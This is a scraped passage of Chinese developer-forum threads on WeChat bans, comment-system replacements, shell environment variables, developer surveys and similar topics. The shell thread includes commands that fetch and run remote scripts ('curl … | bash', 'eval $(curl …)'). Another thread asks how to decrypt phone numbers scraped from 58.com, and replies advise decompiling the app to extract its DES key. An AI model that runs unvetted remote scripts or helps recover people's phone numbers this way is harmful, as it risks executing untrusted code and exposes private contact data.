：违反了哪一条或哪几条\r", "A ：。。。\r", "Q ：有没有办法申诉解封\r", "A ：没有\r", "\r", "LZ 心里平衡点没...你开心就好！", "不用这种流氓。名声臭掉了。和家人只用电报。", "我一个自己的小号，专门用来关注一些杂 7 杂 8 的公众号，在国外用当地手机号注册的，只加了自己大号为好友，不发消息，只看关注的公众号那堆文章，国外用了几个月都很正常，当我前几个月回国连了一下饭店的公用 WiFi ，立马强制退出，和楼主一样遭遇，解封之后，原以为会正常了，可第二天再登陆又 TM 被封了。。。\r", "\r", "PS ：小号的上一任小号也是，用的 QQ 小号登陆，用途和当前小号一样，然后长时间不登陆不解封，现在居然 TM 把号封死了，神经病啊！！！\r", "\r", "PS of PS ：不太明白微信在聊天上哪里好用，都 N 个更新版本了，不要说聊天记录云同步了，即使微信号已经同时登陆手机和平板，平板居然还会漏收消息，而且还是好几条————有时用手机和别人聊了几句，发现手机电量低，就拿手机去充电，就拿平板继续聊， TMD ，一打开对话列表，最底下的消息还是上一天的，刚才聊的那几条估计永远都不会出现在平板上了。。。😒😒😒😒😒😒😒", " 同样国外手机号注册的，第二天就封了。莫名其妙。。。\r", "解封还要别的实名的、绑定银行卡的微信号来担保才能解封，现在就是各种挖掘个人信息。\r", "最智障的还是只能用手机登录的逻辑，所以现在都不用微信了。", " 国外手机号第二天被封，基本上都是国外虚拟号比如 GV 这种无实体 SIM 卡的号码，或者是东南亚国家有实体 SIM 号，总之，微信就是封你没商量，爱用不用", " 在国外手机号流行起来之前注册的就没事", " \r", " \r", " \r", " block 了 事不关己高高挂起", "  @", " 注册用的国内号 绑的 Google voice 感觉方便~ 当然为了装逼 5136661225", "之前有一个微信帐号，长期潜水都不怎么发消息的那种，只是没有实名。有一天也遇到被封，要求手机短信激活。\r", "\r", "现在想来，安全什么、举报什么其实都是幌子和套路而已。只要腾迅需要相关信息，现特么找个理由把你封了，然后提供某某信息才能使用。这种行为明摆了就是利用垄断地位非法获取利益，在法治国家绝对可以集体诉讼。\r", "\r", "另外，最近这个套路 JD 也学了，现在特么用个京豆居然还要实名，理由是：为了用户的安全？ WTF ？对于信息泄露大户，实名了才是最大的安全隐患好不好？\r", "\r", "结论就是尽可能远离国内没有节操的互联网公司。", "更流氓的是 QQ ， QQ 群有人发广告、发色情，点了举报，居然说不存在违规行为 @", " 应该把“没有节操的互联网公司”去掉，要不你不可能做到", "我依稀记得当年谷歌拒绝我登录，给的所有补救措施没一个能用的那种恐惧\r", "而且 tm 一个客服都没有，不愧是广告公司，全都在卖假药吧", "我看到楼上一群回帖不看帖的，老实说挺无语", " 他俩想一起进行一些违规行为，大雾", "人家就是店大欺客。\r", "一旦什么东西被垄断基本就可以为所欲为了。就像 GFW. 要是被搞了除了 complain 一下也没有什么办法。", "假如我坐牢三年,回来还能找到我的微信号吗?", " 是啊, 而且 Google 账号被停用了你也找不到原因, 只甩了一句\"违反用户协议\", 郁闷哦. 我的 google 账号被禁止登陆 youtube 了, 视频都没发过, 评论也只有 dota 频道下有两三天正常的. 至今二丈摸不着头脑, 发申述, 对方还是回\"违反用户协议\", 把用户协议翻来覆去地看, 都不知道我违反了哪一条.", "被谷歌封过一次，还无法解封……", "假如楼主是 假装是女的 骗人汇款或者  骗人充话费 被投诉了 那将会是什么样  自己违规了 微信没通知公安抓你算对得住了  \r", "如果能被那么多人投诉 必定是和金钱有关  如果真是这种情况 又该怎么说", "我想到一个问题：假设微众银行在只绑定了微信的情况下微信被封了，那不就没法登录了么？", "所以被叫做“狗日的腾讯”啊，你以为它是浪得虚名吗？", "玩英雄联盟硬说我是加速挂，封了 3 年，申诉没人理， 3 天准时回个空消息，再也不玩它游戏了", " 想象力真好\r", "说什么你就信什么?", "用 Google Voice 注册的微信  被封号后无法解封 平时就用作和大号互相传文件 好友就一个 不知道 tx 什么逻辑", "亲爱的用户：我是你爹。", " 久经多年又死无对证的故事还是自己对着镜子说吧，没人信", "封个号而已，喜闻乐见"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>多说 6 月 1 号就关了，感觉挺好用的，还有推荐的评论系统吗？\n<a href=\"http://dev.duoshuo.com/threads/58d1169ae293b89a20c57241\" rel=\"nofollow\">http://dev.duoshuo.com/threads/58d1169ae293b89a20c57241</a></p>\n</div></div>"], "reply": "43", "tittle": "多说要关了，有推荐的评论系统吗？", "comment": ["搜狐畅言", "我去...\r", "转到 Disqus 吧", "我用的 disqus 。不过对国内来说有点慢", "畅言", "Disqus ，对于国内的免费服务已经用怕了。", "经常一觉醒来就是满屏的丝袜 A 片。", "网易云跟贴", "网易云跟贴", "目前用 Disqus ，网易云跟贴貌似不错，支持多说数据导入。", "之前用 Disqus 被墙，转用多说现在多说也停了。然后网易云跟帖无法访问，还有谁🙈", "都有人评论么？ (滑稽脸)\r", "没人评论干脆把评论系统去掉算了", " 我的导入之后，没显示啊。。。。。", " 我受到暴击伤害", " 啊哈哈，说的就是你", "Disqus", " \r", " \r", " \r", "Disqus 国内墙了？", "昨天试了下友言，结果不支持 https ， pass 掉；再去畅言，结果要求要备案才能用。\r", "最后只好试下网易评论了，支持 https 。但是它的 SNS 支持较少，只有 QQ ，微博，网易帐号能登录，且加载很慢，网页出来 3-5 秒了，评论框才显示出来。\r", "\r", "先试用一下网易评论： ", "是的，我的博客 ", " 上用的也是网易云跟帖。说说感受吧\r", "\r", "1. 虽然说支持导入多说的数据，昨天导入后，现在也没显示出来\r", "2. 没有表情，只能输入文字\r", "3. 加载略慢\r", "4. 接口较少，比如不能获取不到文章的评论数量、参与数量等\r", "5. 支持 https", " 看来有必要去试用下 网易云跟帖了；毕竟支持导入数据是刚需。", " 时不时还是有一两个的。😁", "Disqus 是彻底被墙，如果要使用的话需要做一些适配，服务端和客户端做一些配合对 disqus 进行反代，客户端才能正常用（并且是两种模式，因为反代 cookie 和域名的限制，没有办法直接调 disqus 的评论框的）；\r", "国内的其他任何一家，我都极！其！强！烈！不推荐使用，没理由。\r", "\r", "最终的解决方案是自建系统，太爽了。\r", "\r", "用了网易云跟帖....但是总觉得哪里不对", "一直在用这个 wpDiscuz", " 网易云跟帖载入的性能比畅言好些，国内外服务节点很多，但还在 beta 阶段，市占率还是畅言比较高...", "换到畅言了， Disqus 国内被墙用不了。还是多说好用。", "网易云跟帖昨天接入了一下。\r", "首先多说到处的时候要记得核对网址，和云跟帖的 js 中网址要一样。\r", "其次带有网址的评论是无法导入的。同理带了某些和谐词汇的评论也是无法导入。\r", "最气的是会有一些评论莫名的导入不了，不知道原因。\r", "---\r", "云跟帖是不能评论网址的。。我很好奇他为什么会有这个设定。。", "自己写……", "用网易云跟帖总觉得气氛哪里不对", "中午换成了畅言，商业化气息太浓厚了，勉强用着。", "多说无益必自毙....", "对比了搜狐畅言和网易云跟帖，最后还是觉得云跟帖相对靠谱", " 禁止外链，可能是为了防止推广水贴，有利有弊吧。", "disqus hypercomment", "要不咱们一起写一个？", "畅言", " 服务器这些怎么办呢？", "Disqus", "wordpress 自带的。当年就怕多说出问题，直接换回去了", "网易云跟帖 昵称导入后，最终显示出来的都是有态度的网友……这扯淡扯到家了……", " 对,这个太扯了", " 最蛋疼的是，我以为是多说格式有问题，自己写脚本按官方规则提取留言板信息专门转化成官方格式的 json 导入了，结果，还是一样把昵称都给改了……圈圈他个叉叉嘞，改了昵称那留言还有个毛的意义……暂时还没找到合适的替代品。畅言是不支持盖楼显示。", "畅言和 disqus 都感觉不错 0 0", "在自己博客多说和 Disqus 都用过，多说不能用了， Disqus 又被墙了，那就就自己写了一个，够自己用就好了，又需要可以看这里： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>人工费咱就不说了，服务器费和域名费用一概不提。\n完全是一副你应该免费友情赞助的微笑脸，拒绝又不好。\n很难办啊，又跟我相同遭遇的童鞋么？</p>\n</div></div>"], "reply": "112", "tittle": "对于朋友来找你做网站这件事真的很烦啊。", "comment": ["这还不简单，自媒体的话来一套我的 wordpress 网站模板就搞定啦\r", "当别人找你借钱的时候，他们通常都是拍着胸脯和你说:咱不是那种人，很快就还你了。之后可能就没有然后了。所以没什么不好意思的", "这个世界上本没有什么人情，有的只是互相利用。当对方没有利用价值时，完全可以抛弃。\r", "\r", "------\r", "\r", "自从计算机专业毕业后，类似的请求铺天盖地，不只是做个网页，还有给 mac 做 xp ，电脑清灰，恢复数据，给 excel 写公式，投票，打长篇手写稿， p 个图，修收音机，甚至还有盗个 qq ，黑个网站，手机定位...\r", "\r", "如果他对你非常重要，即使不喜欢也帮帮吧。说不定以后某事上也会请他帮忙。\r", "\r", "如果他对你来说不是不可或缺，那就麻烦一点了：\r", "\r", "仅仅是认识的人（几年不遇的同学），我的回答一般都是“你是谁？”，“我跟你熟吗？”，“我就是个傻 x 弱智 250 啥都不会”，“我不认为我需要跟你搞好关系”。\r", "\r", "如果是熟人（经常聊天的，舍友或同事），一般会让他四处打听下价格或原理然后给我一个合理的数字。如果跟市面差不多，或了解我帮助他所耗费的精力，也有意向付我适当的报酬（也许不是金钱上），我很有可能免费帮他。\r", "\r", "如果上来就“我们朋友还谈钱？”，“别那么小气”（玩笑除外），那就回“正因为我们不是朋友才需要谈谈钱”，“那你大气一点淘宝花钱搞吧”。\r", "\r", "自从这样，我的“朋友”（这个词过于沉重，我偏向于用“熟人”）数量锐减。\r", "\r", "但我也很快发现，那些成天找我帮忙的人，我完全没必要找他帮忙或他不可能会帮我的忙，换句话说，很大一部分，是我在单向付出。那么我付出了这么多，为的是什么？为的是持续我们的关系。得到的是什么？得到的是以后类似的活还会找我，得到了更多“付出的机会”。与这样的人断绝联系，不但没什么损失，还可以让自己更专注于自己的事情。没什么不好。\r", "\r", "------\r", "\r", "从你的字里行间里体现出的尴尬与厌恶，是狠下心来拒绝他的最好理由。拒绝方式可以委婉一点，比如让他来看这篇帖子...", "先给钱，给钱都好说", "找画家求画就是一件很不礼貌的事情，编程同理。", "域名空间的费用，该给的，算清楚且提供具体明细，这个钱建议别多要。事关做人。\r", "人工费，这个看情况，不好一竿子打死，我有个哥们，确实关系铁的那种，生死之交，不是酒肉朋友，这点很难分清楚，但是我和这哥们之间有很多故事。。。\r", "当年哥们落难的时候要推销一批商品，我那会还是程序猿的时候。。。人工费我没要，那会工资还可以，其实域名空间费用也没收，但是多少钱，我是明明白白告诉了那哥们，我自己没打算要，但是即使这样的关系，哥们也坚持给了，他自己穷的几十块钱过一个月的时候，但他那会说了一句话，我觉的人是靠谱的，他说，即使哥们天天找你蹭饭，情记住了，但是该多少钱的事情，会算清楚，只为了兄弟间更好做兄弟。\r", "现在这哥们度过难关了，我相信以后我有难，这哥们会帮。一辈子也就 2 个兄弟。如果确定是兄弟，该帮要帮。\r", "当然，以上是我认为真兄弟的时候。如果是朋友，我个人觉得不如直接说清楚的好，不表态是最差的一种处理方式，不表态有可能朋友都没得做。\r", "我个人喜欢，要不说清楚，宁愿说清楚认清楚一个人，也好过模模糊糊不晓得啥意思，错过一个可以结交的人。\r", "最次，如果仅仅是个认识的人，我个人觉得可以适当赚一点小钱。留个后路，说不定以后还找你干活。\r", "\r", "说实话，开发个网站，如果你自己实力够，而需求又不是特别复杂，赚不了多少钱。需求复杂的另说。", "现在比较忙，我有个同学的公司专门做这个的，我介绍他给你吧。", "直接拒绝", "朋友找我做，我给他做了，结果他不满意，现在连剩下的一半尾款都没收到到", "你说你帮老王做的那个贼简单 要一万", "其实更关键的是，做完以后是没完没了的，要你维护的", "你只需要知道一点 你现在仅仅是做一个站点 但是随之而来的就是维护一个站点了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://apphouse.58.com/api/detail/zufang/25468442331579?v=1&amp;signature=1224743ea6a1e25b3ca975c0556ff2d6&amp;commondata=%7B%22hasNext%22%3Atrue%2C%22nextObserverIndex%22%3A0%2C%22tracekey%22%3A%2232ce5f611f33424facbf344e576ef354%22%7D&amp;sidDict=%7B%22PGTID%22%3A%22%22%2C%22GTID%22%3A%22124664390195350127894720130%22%7D&amp;format=json&amp;localname=zz\" rel=\"nofollow\">https://apphouse.58.com/api/detail/zufang/25468442331579?v=1&amp;signature=1224743ea6a1e25b3ca975c0556ff2d6&amp;commondata=%7B%22hasNext%22%3Atrue%2C%22nextObserverIndex%22%3A0%2C%22tracekey%22%3A%2232ce5f611f33424facbf344e576ef354%22%7D&amp;sidDict=%7B%22PGTID%22%3A%22%22%2C%22GTID%22%3A%22124664390195350127894720130%22%7D&amp;format=json&amp;localname=zz</a></p>\n<p>这里面有一个\"phonenum\":\"DAAFC690BDDD0147379F9DE68D38977A\" 求助电话解密的方法</p>\n<p>下边是抓取的几个电话：</p>\n<p>18137883939 加密后： DAAFC690BDDD0147379F9DE68D38977A</p>\n<p>15890079760 加密后： 7CCB538B32383D193E339484A6B2DE44</p>\n<p>15837103899 加密后： 6EEA960BEE1E81304B0A93349C64BF35</p>\n<p>求大神指点</p>\n</div></div>"], "reply": "7", "tittle": "[求助] 关于电话号码解密", "comment": ["可以看看 js 情况", " 58 的租房电话现在只能在 app 里面查看， js 也研究了，无果呀", "对称密钥算法都要有知道 key 的，哪有这么容易解出来。。\r", "\r", "给个思路：把 Android 客户端反编译成 Java 代码，可读性很好，很容易就能找到解密的代码", "我记得代码是存在动态链接库里， des 的 key 也在里面。", " 您好，我是做.net 的，能指点下怎么搞出来不？谢谢了", "研究 is\r", "或者逆向客户端"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本项目原本做的是一个海外留学生活助手，含电商，社交等热门模块。</p>\n<p>起名 Bibi ，是本人对我女友的爱称。一年多前，也是源于我们的创业想法，才开展了这个项目。</p>\n<p>不过这个项目后来失败了，就再也没有维护了。</p>\n<p>时至今日，决定把这套代码开源出来。</p>\n<p>具体的 Quickstart 和 Deploy 方式，已写在各个项目的 README 上</p>\n<hr>\n<p>Bibi 提供电商全栈解决方案，配合以下项目使用:</p>\n<blockquote>\n<p><a href=\"https://github.com/seasonstar/bibi\" rel=\"nofollow\">https://github.com/seasonstar/bibi</a></p>\n</blockquote>\n<p>电商服务后端，基于 Flask, MongoDB, Redis, Celery, RabbitMQ, 支持 Python 3.5.</p>\n<blockquote>\n<p><a href=\"https://github.com/seasonstar/bibi-frontend\" rel=\"nofollow\">https://github.com/seasonstar/bibi-frontend</a></p>\n</blockquote>\n<p>微信前端项目，采用 Angularjs, gulp</p>\n<blockquote>\n<p><a href=\"https://github.com/seasonstar/bibi-ionic\" rel=\"nofollow\">https://github.com/seasonstar/bibi-ionic</a></p>\n</blockquote>\n<p>Hybrid App 源码，采用 Ionic, Cordova</p>\n<p>有问题的请提 issue ，也希望能跟更多的朋友学习，交流。欢迎 Star &amp; Fork</p>\n</div></div>"], "reply": "7", "tittle": "整理并开源一套电商全栈解决方案，包含后端服务，微信前端，手机 App 端，系本人之前的创业项目", "comment": ["支持一个，周末刚好要帮家里超市写个电商，后端我就直接用这个了", "不管怎么样 先资糍一波", "这爱称…………", "支持", "正好拿来学 python", "赞一个", " 欢迎使用，本地超市类电商，要注意更改地址模型和支付货币模型"]},
{"content": "", "reply": "3", "tittle": "如何导出／备份 iCloud Notes", "comment": ["同问啊，我之前主要用美区，但是无法买 icloud 空间，所以注册了个国区的 icloud ，现在大部分内容都通过 imac 同步了。相当于 imac 中间过度了一下， key chain ，浏览器记录都同步到了国区帐号。但是就是 notes 忘记了在本地保存。现在也面临需要转移的问题。", "上次无聊把 EverNote 导入 Notes ，发现不好管理就删掉了导入的数据，然后悲剧的发现空间一直占用着。", " 应该要过一段时间才会消失，或者到 ", " 上去看看是不是有什么备份之类的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>遇到一个不能理解的问题</p>\n<pre><code>在 shell 脚本中设置环境变量，执行脚本之后环境变量未生效，但在 terminal 手动 source 一下 bashrc 之后就生效了\n</code></pre>\n<p>部分 shell 脚本如下：</p>\n<pre><code>#!/bin/bash\n.\n.\n.\nDS_KEYFROM=\"xxx\"\nDS_KEY=\"xxx\"\necho \"export DS_KEYFROM=\\\"$DS_KEYFROM\\\"\" &gt;&gt; ~/.bashrc\necho \"export DS_KEY=\\\"$DS_KEY\\\"\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n.\n.\n.\n</code></pre>\n<p>执行脚本之后<code>echo $DS_KEYFROM</code> 和 <code>echo $DS_KEY</code>都没有值</p>\n<p>但是查看 bashrc <code>cat ~/.bashrc</code>是显示已经设置成功的：</p>\n<pre><code>.\n.\n.\nexport DS_KEYFROM=\"xxx\"\nexport DS_KEY=\"xxx\"\n.\n.\n.\n</code></pre>\n<p>此时如果手动 source 一下 bashrc <code>source ~/.bashrc</code>，环境变量就生效了。</p>\n<p>有人知道怎么解决这个问题吗？如何直接执行脚本之后就让环境变量生效？</p>\n</div></div>"], "reply": "30", "tittle": "shell 设置环境变量的问题", "comment": ["因为脚本执行的 shell 进程号和执行完脚步 echo 的进程号不一致呀。", " 因为脚本执行的 shell 进程号和你在脚本使用过后 echo 时用的 shell 的进程号不一致。你在当前 shell 手工 source 一下或者开一个新的 shell 就可以了", "简单说是因为当前 shell 未重载 bashrc 导致的。可以试试. ./a.sh", " \r", "但现在我的需求就是在不手动 source 的前提下直接让环境变量生效，如体直接在 shell 脚本里面的 `source ~/.bashrc` \r", "\r", "ps 重开一个 shell 也是无效的   没有手动 source 的前提下  感觉就是没有设置成功的", " 刚觉像是直接执行脚本的时候 开了一个子 shell ，于是我脚本中的 source 命令相当于在子 shell 中执行了", "用 source script.sh 直接执行脚本 不用 sh script.sh", "1 楼正解", " 如果这是个 install 脚本  有没有办法可以直接通过 raw 执行呢？  还是我必须得把脚本下载到本地之后再手动 source 执行？", " 一样的。 source script.sh 就是. ./script.sh ，在当前 shell 内执行、 而不是产生一个 sub-shell 来执行", " eval $(curl xxxx)", " 了解 目前确实只有手动 source 才能解决问题了", "感觉你好像并没理解楼上两位的意思。\r", "直接 source 执行你的脚本。", " 楼上说的都明白 只是没有解决我的问题 。我是希望不通过手动 source 执行就能解决问题，然而貌似并不行。\r", "\r", "具体情况是这样\r", "假设有一段 install 脚本放在 github 仓库上，那我可以用 `curl -s raw_file.sh | bash` 直接执行，但如果脚本里面有设置环境变量的语句，那就无法实现了", "要嘛是写死在\r", "/etc/rc.local 然后 reboot\r", " 或者写在 /etc/profile 然后 source /etc/profile\r", "要嘛只能在程序内部调用\r", "\r", "不建议放在 bashrc ，因为定时任务的时候是没有登陆操作，没法加载你这个 bashrc", " 就是个在当前用户下作用的小脚本，所以就放 bashrc 了👨🏼‍💻", " rc.local 也不是全局的", "所以你以为 source 是做什么用的", " 天真的以为在脚本中 source 就足够了", "Bash 有好几种启动方式： login 、 interactive 等，相关的几个配置文件作用也有区别。\r", "\r", "~/.bashrc 好像对于 Bash 脚本文件是不起作用的。\r", "你可以试试~/.bash_profile 、~/.profile 。\r", "\r", "具体说明请参考：\r", "子进程无法影响到父进程的环境变量", "父进程可以通过 export xx=xx 影响子进程的环境变量", " 我上一条回复中间一句有问题，请忽略。（不经常用，有些概念就模糊了。）", " 错。是通过 export 为尚未启动的子进程准备初始环境变量", " 请问下，如果在用户下的 bashrc 中 export 了环境变量，那重开一个 shell 的时候为什么也无效？ login 的时候不是应该要加载一次 bashrc 的吗", "  参考 pyenv rvm 等 一些包管理工具的做法；\r", "\r", "curl url | bash - \r", "\r", "之后，修改了 bashrc ，  或者提示你 把一些内容加到 bashrc 里，但是当前 shell 不会生效。\r", "\r", "所以需要，重开窗口，或者 exec $SHELL -l", " 嗯  我现在将脚本中的 source 语句删掉了  执行脚本完之后抛出一个 source bashrc 的提醒", " 你“重开”的那个 shell 是怎么开的？ man bash 看 INVOCATION 那一段核对一下具体是哪一种", " 后来发现是 zsh 导致，默认加载了 zshrc ，我在 zshrc 里面 source 了 bashrc 就没问题了", " 不错，总算是找到原因并解决了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Stack Overflow 今年的调查结果</p>\n<p><a href=\"https://stackoverflow.com/insights/survey/2017/?utm_medium=email&amp;utm_campaign=dev-survey-2017&amp;utm_content=em-features&amp;utm_source=so-owned#technologies-and-occupations\" rel=\"nofollow\">https://stackoverflow.com/insights/survey/2017/?utm_medium=email&amp;utm_campaign=dev-survey-2017&amp;utm_content=em-features&amp;utm_source=so-owned#technologies-and-occupations</a></p>\n<p>想想当初自己好不容易自学了 C++出来想做游戏，最后也是几经辗转又被拉回去写 JS ，估计这贼船我以后也下不来了。</p>\n<p>写游戏也只能作为业余爱好了。</p>\n<p>话说有什么好的游戏资源网站求分享，不侵犯版权的那些资源。</p>\n</div></div>", "<div class=\"topic_content\">游戏资源是指独立游戏制作的一些音效贴图材质啊。🤣</div>"], "reply": "16", "tittle": "Most Popular Languages by Occupation, 这 JavaScript 简直是到处都是", "comment": ["以前玩一个游戏叫什么啊姐姐要出来了，里面用的开门什么的音效都是某个网站找的，后来我还去那个网站找了下，虽然资料总量不多但是挺实用的", "也许只是写 JS 人更喜欢去 GitHub ，而这些人做了问卷而已，并不代表 JS 到处都是。", " 这跟 github 有什么关系？", " js 确实到处都是\r", "这是一个奇葩的语言，小到在一颗小芯片上做硬件开发，大到在服务器上支撑一票软件栈，再或者是本本分分当一枚胶水。\r", "最近几年看它的使用我都想笑，太逗比了", "vscode 这么热门了啊，受不了它的代码粘贴格式", "C++ 太重太专业了， 发展了这么久，现在 js 写游戏很方便， Unity 就可以用 JS 和 C# 两种语言， 再说各种 Web Game 的框架层出不穷， 2D 、 3D 的都有。", "主要现在 node 跑 js 也不慢 学着还简单 啥方面的框架都有一点 楼主可以看看 whitestormjs", " unity 可以 js 了？我记得当初我学的时候只能 java 和 c#😶", " 我以前收藏过 adobe 出的免费资源，后来收藏资源的那台电脑没带在身边🤒", " \r", " \r", "\r", "一直都只有 unityscript 和 c#两种支持……", " 好吧，我应该是记错了， unityscript 貌似就是 js 吧", " \r", "\r", "js 的亚种，有些差异"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"qr\" src=\"http://wx4.sinaimg.cn/mw690/83915817ly1fe3uyfopfbj20by0dmgml.jpg\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "第一个小程序-三国杀武将简介", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3><a href=\"http://stackoverflow.com/insights/survey/2017/\" rel=\"nofollow\"><strong>Stack Overflow 发布 2017 程序员调查结果</strong></a></h3>\n<p>超过 6 万 4 千名程序员参与了此次调查，有很多有趣的发现. 譬如: 有 56.5%的受访者认为自己工资过低; 有 13.1%的人表示他们在积极的找工作, 有 75.2%的人表示他们会考虑新的工作机会.</p>\n<blockquote>\n<p>Only 13.1% of developers are actively looking for a job. But 75.2% of developers are interested in hearing about new job opportunities.</p>\n</blockquote>\n<p>90%的受访者表示他们是自学成才(Self-taught); 72.6%的受访者认为自己是 Webdeveloper, 62.5%的受访者使用 JavaScript, 有 73.9%的 SysAdmin/DevOps 表示他们使用 JavaScript.</p>\n<p>详细的报告请阅读: <a href=\"http://stackoverflow.com/insights/survey/2017/\" rel=\"nofollow\">Developer Survey Results 2017</a>, 同时 Stack Overflow 也有一期关于调查结果的播客: <a href=\"https://stackoverflow.blog/2017/03/22/podcast-105-wait-developer-survey-2017-results/\" rel=\"nofollow\">Podcast #105: The Wait is Over! Developer Survey 2017 results are in.</a></p>\n<h3><strong>如何成为一个更好的程序员</strong></h3>\n<p>关于这个话题, 小编要推荐两篇文章:</p>\n<ul>\n<li>\n<p><a href=\"http://jlongster.com/How-I-Became-Better-Programmer\" rel=\"nofollow\"><strong>How I Became a Better Programmer</strong></a></p>\n<p>干货甚多, 翻译几条, 与君共勉:</p>\n<ul>\n<li>找到能激励你的人, 但不要盲从他们.</li>\n<li>即使你是新人, 也不要低估自己的工作.</li>\n<li>新技术层出不穷, 不要疲于奔命. 多数都是老调重弹, 革命性的创新并不是每年都有.</li>\n<li>忽略皮毛, 譬如新的语法, 新的 library APIs, 配置 build 工具等等.</li>\n<li>深入了解以往的研究结果, 譬如阅读<a href=\"https://github.com/papers-we-love/papers-we-love\" rel=\"nofollow\">Papers We Love GitHub repo</a>.</li>\n<li>做点有挑战的事情. 譬如, 写一个 compiler.</li>\n</ul>\n</li>\n<li>\n<p><a href=\"http://www.daedtech.com/turning-tech-hobbies-into-side-hustle/\" rel=\"nofollow\"><strong>Turning Tech Hobbies into Side Hustle</strong></a></p>\n<p>四年前立下雄心壮志要学习某某语言, 结果到如今只是\"从入门到放弃\". 怎样高效的学习一门新技术? 找到动机 e.g. <code>help who and do what</code>. 找到潜在用户, 然后做成一个 side hustle.</p>\n<p>文中提到的另一篇关于程序员修炼的文章: <a href=\"https://blog.codinghorror.com/sharpening-the-saw/\" rel=\"nofollow\">Sharpening the Saw</a></p>\n</li>\n</ul>\n<h3><a href=\"http://www.infoq.com/cn/articles/how-to-encrypt-the-user-password-correctly\" rel=\"nofollow\">(中文) <strong>如何正确对用户密码进行加密？</strong></a></h3>\n<p>还记得<a href=\"http://www.csdn.net/article/2011-12-21/309505\" rel=\"nofollow\">2011 年的 CSDN 密码泄露事件</a>么? 用户密码到底该以哪种形式存储? 像曾经的 CSDN 那样明文存储吗?</p>\n<p>一起来读一读 InfoQ 翻译的<a href=\"http://www.infoq.com/cn/articles/how-to-encrypt-the-user-password-correctly\" rel=\"nofollow\">如何正确对用户密码进行加密？</a>\n英文原文: <a href=\"https://crackstation.net/hashing-security.htm\" rel=\"nofollow\">Salted Password Hashing - Doing it Right</a></p>\n<h3><a href=\"https://hackernoon.com/configuration-management-is-an-antipattern-e677e34be64c#.swhue3t7y\" rel=\"nofollow\"><strong>配置管理是一种反模式 Configuration Management is an Antipattern</strong></a></h3>\n<p>谁来负责维护 Configuration? Ops? Dev? 总有那么几台机器因为各种原因而没有接收到最近的更新, 怎么办?　 try/catch + monitoring tool?</p>\n<blockquote>\n<p>configuration management promises that you ’ ll know the complete state of your infrastructure, but it never works that way.</p>\n</blockquote>\n<p><strong>解决方案 - immutable infrastructure</strong>: 先 build 一个 base image, 然后安装具体的 app, build 成为包含具体 app 的 image. 然后部署这些 image.</p>\n<blockquote>\n<p>Your base image should have the latest security updates as well as any base infrastructure packages that are run platform-wide. Things like your monitoring packages, or your service discovery. Now, you could use a configuration management tool to build your base image, but you could also use OS packages and a little python to install and configure your base image.</p>\n</blockquote>\n<blockquote>\n<p>Once you have that base image, you install your application and its dependencies on the base image using your standard package manager (like apt-get or yum). If you have your dependencies configured in your package correctly, this is basically one step.</p>\n</blockquote>\n<blockquote>\n<p>You compile that into a new application specific image, push that to all your was regions, and viola! Immutable infrastructure!</p>\n</blockquote>\n<hr>\n<p>by <a href=\"https://ninjadevops.com\" rel=\"nofollow\">ninjadevops.com</a></p>\n<p>Rss 订阅: <a href=\"http://ninjadevops.com/feed.xml\" rel=\"nofollow\">http://ninjadevops.com/feed.xml</a></p>\n<p>微信订阅:</p>\n<p><img alt=\"微信订阅:\" src=\"https://raw.githubusercontent.com/devopshub-org/devopshub-org.github.io/master/_resources/qrcode_wechat.jpg\"></p>\n</div></div>"], "reply": "1", "tittle": "DevOpsWeekly#18 Stack Overflow 发布 2017 程序员调查结果; 如何成为一个更好的程序员? 正确的对用户密码进行加密; 配置管理是一种反模式", "comment": ["Nice"]},
{"content": ["<div class=\"topic_content\">QMutex 经常出错。\r<br>ps:本人小白，刚看 YouTube 教程发现 osx 下出错， win 下正常。然后搜索了一下，发现 stackoverflow 上也有人抱怨说\r<br>\r<br>On Mac OS X I had QMutex hangs even in a 100% correct logic.\r<br>Note however, this problem only occurred on OS X in my case. On Windows the same code was working perfectly.</div>"], "reply": "28", "tittle": "qt 对 mac 的适配不太好啊， macOS 或 win 谁才是最好的开发平台？", "comment": ["问题是有的，特别是平台相关的问题，关键是怎么去解决，别一个小问题上升到否定一个整体的高度，与其讨论谁是最好的开发平台，你还不如贴出有问题的代码让大家帮忙看，要不然你换一个开放平台出了个小问题又回到这个点上没啥意义", "再说有 bug 很正常，可以去官方反馈，下个版本说不定就修复了\r", "mac 上一大堆软件是 Qt 开发出来的", "electron", "我觉得除了 ios 和 macos ，没必要用 mac 。", "我觉得除了 Windows 开发，没必要用 Windows ：）", " mac 会省心很多，我之前从 win 转过来的，因为懒得开 win ，我连游戏都戒了。", " +1", "楼主这叫因噎废食", " 或者说根本没空打游戏", "electron+1", "又一个引战的么", "Windows 平台开发可以说 .Net 效率最高， 如果你掌握 .Net 的话， 在 Mac 平台上可以继续使用 MonoMac ， C# 大法好！", "我觉得除了做 Mac 开发，没必要用 Mac\r", "(按照某楼逻辑", "一大波 iOS 开发者在路上", "真的就能每天无聊到讨论最好的语言，最好的开发平台么？  有什么意思？\r", "萝卜白菜各有所爱，非要讨论这种真的有意思嘛？", "楼已经歪了……\r", "我觉得如果不是为了活着，没必要吃饭", "考虑到楼上都否定了游戏在 win 的地位，我觉得应该补充一下\r", "除了 win 开发和玩游戏，没必要用 win 🌚", "光开发, 可以不用 win\r", "\r", "如果又想开发, 又要使用 pc 行业软件, 用 win 不错", "闲的人才会天天比较平台和语言", "ios 开发只能用 mac os ，.net 开发用.net 大法最好。\r", "\r", "少数公司要求和生产环境一致，你被迫要用 rh 和 debian 做桌面...\r", "\r", "除此之外， ide 都跨平台了，开发体验还能有什么差别.....\r", "\r", "\r", "------------\r", "\r", "win 平台最大优点就是你可以码累了随时来把 lol 或昆特牌。\r", "\r", "ios 平台最大优点就是你心里痒痒想来把 lol 昆特牌的时候，发现还要重启到 bootcamp ，想了想就放弃了。", "linux 哭晕在厕所", "坚信自己能搞定吧，你看 telegram 跨平台就挺好的", "用 c++标准 mutex", "这个事儿就像高铁和飞机哪个好一样……", 